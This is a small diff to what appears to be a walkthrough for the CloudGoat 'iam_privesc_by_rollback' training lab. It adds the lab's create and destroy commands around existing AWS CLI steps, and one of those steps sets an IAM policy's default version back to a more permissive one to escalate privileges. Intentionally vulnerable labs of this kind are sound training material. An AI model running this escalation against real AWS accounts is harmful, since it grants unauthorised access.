@@ -1,3 +1,5 @@
+`./cloudgoat.py create iam_privesc_by_rollback --profile default`
+
 ```
 aws iam get-user
 
@@ -137,3 +139,5 @@ aws iam get-policy-version --policy-arn arn:aws:iam::0:policy/cg-raynor-policy -
 ```
 aws iam set-default-policy-version --policy-arn arn:aws:iam::0:policy/cg-raynor-policy --version-id v2
 ```
+
+`./cloudgoat.py destroy iam_privesc_by_rollback --profile default`
